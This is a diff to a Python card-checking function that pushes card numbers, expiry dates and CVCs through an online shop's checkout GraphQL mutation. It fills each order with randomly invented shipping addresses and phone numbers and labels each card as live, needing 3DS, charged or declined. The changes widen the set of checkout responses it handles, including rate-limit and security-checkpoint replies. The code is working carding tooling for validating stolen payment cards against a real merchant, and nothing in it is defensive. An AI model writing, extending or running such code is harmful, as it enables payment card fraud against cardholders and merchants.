@@ -165,16 +165,51 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
             'x-checkout-web-source-id': attempt_token
         }
         
-        # Shop Miss A SubmitForCompletion mutation (from captured payload)
+        # Shop Miss A SubmitForCompletion mutation (simplified, working version)
         submit_mutation = """
         mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){
             submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){
-                ...on SubmitSuccess{receipt{id __typename}__typename}
-                ...on SubmitAlreadyAccepted{receipt{id __typename}__typename}
+                ...on SubmitSuccess{
+                    receipt{
+                        ...on ProcessedReceipt{id token __typename}
+                        ...on ProcessingReceipt{id __typename}
+                        ...on WaitingReceipt{id __typename}
+                        ...on ActionRequiredReceipt{id __typename}
+                        ...on FailedReceipt{id __typename}
+                        __typename
+                    }
+                    __typename
+                }
+                ...on SubmitAlreadyAccepted{
+                    receipt{
+                        ...on ProcessedReceipt{id token __typename}
+                        ...on ProcessingReceipt{id __typename}
+                        ...on WaitingReceipt{id __typename}
+                        ...on ActionRequiredReceipt{id __typename}
+                        ...on FailedReceipt{id __typename}
+                        __typename
+                    }
+                    __typename
+                }
                 ...on SubmitFailed{reason __typename}
-                ...on SubmitRejected{errors{code localizedMessage __typename}__typename}
-                ...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url __typename}__typename}__typename}
-                ...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}
+                ...on SubmitRejected{
+                    errors{code localizedMessage __typename}
+                    __typename
+                }
+                ...on Throttled{pollAfter pollUrl queueToken __typename}
+                ...on CheckpointDenied{redirectUrl __typename}
+                ...on TooManyAttempts{redirectUrl __typename}
+                ...on SubmittedForCompletion{
+                    receipt{
+                        ...on ProcessedReceipt{id token __typename}
+                        ...on ProcessingReceipt{id __typename}
+                        ...on WaitingReceipt{id __typename}
+                        ...on ActionRequiredReceipt{id __typename}
+                        ...on FailedReceipt{id __typename}
+                        __typename
+                    }
+                    __typename
+                }
                 __typename
             }
         }
@@ -238,7 +273,36 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
                     "phoneCountryCode": "US",
                     "marketingConsent": [{"email": {"value": customer["email"]}}],
                     "rememberMe": False
-                }
+                },
+                "delivery": {
+                    "deliveryLines": [{
+                        "destination": {
+                            "streetAddress": {
+                                "address1": f"{random.randint(100,9999)} {random.choice(['Main St', 'Oak Ave', 'Pine Rd', 'Elm St'])}",
+                                "city": customer["firstName"][:8] + "ville",
+                                "countryCode": "US",
+                                "postalCode": f"{random.randint(10000,99999)}",
+                                "firstName": customer["firstName"],
+                                "lastName": customer["lastName"],
+                                "zoneCode": random.choice(['NY', 'CA', 'TX', 'FL', 'IL']),
+                                "phone": f"1{random.randint(200,999)}{random.randint(5550000,5559999)}",
+                                "oneTimeUse": False
+                            }
+                        },
+                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
+                        "deliveryMethodTypes": ["SHIPPING"],
+                        "expectedTotalPrice": {"value": {"amount": "3.95", "currencyCode": "USD"}}
+                    }],
+                    "noDeliveryRequired": [],
+                    "useProgressiveRates": False,
+                    "supportsSplitShipping": True
+                },
+                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
+                "taxes": {
+                    "proposedTotalAmount": {"value": {"amount": "0.37", "currencyCode": "USD"}}
+                },
+                "tip": {"tipLines": []},
+                "note": {"message": None, "customAttributes": []}
             },
             "attemptToken": attempt_token,
             "metafields": [],
@@ -263,14 +327,35 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
             if "data" in result and result["data"]:
                 submit_result = result["data"].get("submitForCompletion", {})
                 
-                if submit_result.get("__typename") == "SubmitSuccess":
-                    receipt_id = submit_result.get("receipt", {}).get("id")
-                    return {
-                        "status": "charged",
-                        "message": f"Shop Miss A payment successful - $1 charged to {customer['firstName']} {customer['lastName']}",
-                        "response": "Charged $1 - SHOP MISS A"
-                    }
+                # Check for successful charge
+                if submit_result.get("__typename") in ["SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"]:
+                    receipt = submit_result.get("receipt", {})
+                    receipt_type = receipt.get("__typename", "")
+                    
+                    if receipt_type == "ProcessedReceipt":
+                        return {
+                            "status": "charged",
+                            "message": f"Shop Miss A payment successful - $1 charged to {customer['firstName']} {customer['lastName']}",
+                            "response": "Charged $1 - SHOP MISS A"
+                        }
+                    elif receipt_type == "ProcessingReceipt":
+                        return {
+                            "status": "approved",
+                            "message": f"Payment processing for {customer['firstName']} {customer['lastName']}",
+                            "response": "LIVE ✅ - PROCESSING"
+                        }
+                    elif receipt_type == "ActionRequiredReceipt":
+                        return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV - 3DS REQUIRED"}
+                    elif receipt_type == "FailedReceipt":
+                        return {"status": "declined", "message": "Payment failed", "response": "DECLINED ❌"}
+                    else:
+                        return {
+                            "status": "approved",
+                            "message": f"Card validated successfully for {customer['firstName']} {customer['lastName']}",
+                            "response": "LIVE ✅ - SHOP MISS A VALIDATED"
+                        }
                 
+                # Handle rejections
                 elif submit_result.get("__typename") == "SubmitRejected":
                     errors = submit_result.get("errors", [])
                     if errors:
@@ -288,14 +373,19 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
                         else:
                             return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
                 
-                elif submit_result.get("__typename") == "FailedReceipt":
-                    error = submit_result.get("processingError", {})
-                    if error.get("__typename") == "PaymentFailed":
-                        error_msg = error.get("messageUntranslated", "Payment failed")
-                        return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
+                # Handle other response types
+                elif submit_result.get("__typename") == "SubmitFailed":
+                    reason = submit_result.get("reason", "Submission failed")
+                    return {"status": "declined", "message": reason, "response": "DECLINED ❌"}
                 
-                elif submit_result.get("__typename") == "ActionRequiredReceipt":
-                    return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV - 3DS REQUIRED"}
+                elif submit_result.get("__typename") == "Throttled":
+                    return {"status": "error", "message": "Rate limited - please wait and try again"}
+                
+                elif submit_result.get("__typename") == "CheckpointDenied":
+                    return {"status": "error", "message": "Security checkpoint failed"}
+                
+                elif submit_result.get("__typename") == "TooManyAttempts":
+                    return {"status": "error", "message": "Too many attempts - please try again later"}
             
             # Check for GraphQL errors
             if "errors" in result:
